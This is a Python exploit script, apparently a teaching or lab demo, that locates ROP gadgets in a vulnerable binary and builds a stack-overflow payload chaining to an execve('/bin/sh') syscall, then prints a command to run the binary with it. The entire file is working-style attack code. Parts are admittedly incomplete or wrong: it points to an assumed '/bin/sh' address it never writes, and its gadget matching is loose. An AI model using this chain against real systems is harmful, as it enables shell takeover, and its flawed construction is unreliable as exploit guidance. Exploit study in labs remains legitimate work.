#!/usr/bin/env python3
"""
Advanced ROP Exploit - Spawns a Shell

This is an improved version that creates a working ROP chain
to execute /bin/sh using the execve syscall.

For educational purposes only!
"""

import struct
import sys
import os
import subprocess
import re

def p64(addr):
    """Pack a 64-bit address in little-endian format"""
    return struct.pack('<Q', addr)

def find_all_gadgets(binary_path):
    """Find all useful ROP gadgets"""
    gadgets = {}
    
    try:
        result = subprocess.run(
            ['objdump', '-d', binary_path],
            capture_output=True,
            text=True,
            check=True
        )
        
        lines = result.stdout.split('\n')
        
        for i, line in enumerate(lines):
            addr_match = re.search(r'([0-9a-f]+):', line)
            if not addr_match:
                continue
            
            addr = int(addr_match.group(1), 16)
            
            # Find ret
            if line.strip().endswith('ret') and 'pop' not in line and 'call' not in line:
                if 'ret' not in gadgets:
                    gadgets['ret'] = addr
            
            # Find pop rdi; ret
            if 'pop' in line and 'rdi' in line:
                if i + 1 < len(lines) and 'ret' in lines[i + 1]:
                    gadgets['pop_rdi'] = addr
            
            # Find pop rsi; pop r15; ret
            if 'pop' in line and 'rsi' in line:
                gadgets['pop_rsi_r15'] = addr
            
            # Find pop rdx; ret
            if 'pop' in line and 'rdx' in line:
                gadgets['pop_rdx'] = addr
            
            # Find pop rax; ret
            if 'pop' in line and 'rax' in line:
                gadgets['pop_rax'] = addr
            
            # Find syscall
            if 'syscall' in line and 'call' not in line:
                gadgets['syscall'] = addr
        
    except subprocess.CalledProcessError as e:
        print(f"[-] Error: {e}")
        sys.exit(1)
    
    return gadgets

def create_rop_chain(gadgets, bin_sh_str):
    """
    Create ROP chain for execve("/bin/sh", NULL, NULL)
    
    System call: execve
    Syscall number (rax): 59 (0x3b)
    First argument (rdi): pointer to "/bin/sh"
    Second argument (rsi): NULL
    Third argument (rdx): NULL
    """
    
    chain = b""
    
    # We'll place /bin/sh string on the stack and use its address
    # For simplicity, we'll use a known writable address
    
    print("[*] Building ROP chain for execve('/bin/sh', NULL, NULL)")
    
    # Note: This is a simplified version
    # In a real exploit, you'd need to place /bin/sh in memory first
    # or find it in the binary/libc
    
    if 'pop_rdi' in gadgets:
        print(f"    [+] pop rdi; ret @ 0x{gadgets['pop_rdi']:x}")
        chain += p64(gadgets['pop_rdi'])
        # We need to put address of /bin/sh here
        # For this demo, we'll use 0x404000 (typical .data section)
        chain += p64(0x404000)
    
    if 'pop_rsi_r15' in gadgets:
        print(f"    [+] pop rsi; pop r15; ret @ 0x{gadgets['pop_rsi_r15']:x}")
        chain += p64(gadgets['pop_rsi_r15'])
        chain += p64(0x0)  # rsi = NULL
        chain += p64(0x0)  # r15 = dummy
    
    if 'pop_rdx' in gadgets:
        print(f"    [+] pop rdx; ret @ 0x{gadgets['pop_rdx']:x}")
        chain += p64(gadgets['pop_rdx'])
        chain += p64(0x0)  # rdx = NULL
    
    if 'pop_rax' in gadgets:
        print(f"    [+] pop rax; ret @ 0x{gadgets['pop_rax']:x}")
        chain += p64(gadgets['pop_rax'])
        chain += p64(59)  # execve syscall number
    
    if 'syscall' in gadgets:
        print(f"    [+] syscall @ 0x{gadgets['syscall']:x}")
        chain += p64(gadgets['syscall'])
    
    return chain

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 exploit_advanced.py <vulnerable_binary>")
        sys.exit(1)
    
    binary_path = sys.argv[1]
    
    if not os.path.exists(binary_path):
        print(f"[-] Binary not found: {binary_path}")
        sys.exit(1)
    
    print("=" * 70)
    print("  Advanced ROP Exploit - Shell Spawning Demo")
    print("=" * 70)
    print()
    
    # Find gadgets
    print("[*] Searching for ROP gadgets...")
    gadgets = find_all_gadgets(binary_path)
    
    print(f"\n[+] Found {len(gadgets)} useful gadgets:")
    for name, addr in sorted(gadgets.items()):
        print(f"    {name:15} @ 0x{addr:x}")
    
    # Create /bin/sh string
    bin_sh = b"/bin/sh\x00"
    
    # Build payload
    offset = 136  # buffer (128) + saved rbp (8)
    
    payload = b"A" * offset
    
    # Add ROP chain
    rop_chain = create_rop_chain(gadgets, bin_sh)
    payload += rop_chain
    
    print(f"\n[*] Total payload size: {len(payload)} bytes")
    
    # Save payload
    with open("exploit_advanced.bin", "wb") as f:
        f.write(payload)
    
    print(f"[+] Payload saved to: exploit_advanced.bin")
    print()
    print("[*] Note: This exploit demonstrates ROP concepts.")
    print("    In a real scenario, you'd need to:")
    print("    1. Find or place '/bin/sh' in memory")
    print("    2. Bypass additional protections (ASLR, etc.)")
    print("    3. Potentially leak addresses first")
    print()
    print("[*] Test with:")
    print(f"    ./{os.path.basename(binary_path)} \"$(cat exploit_advanced.bin)\"")
    print()

if __name__ == "__main__":
    main()
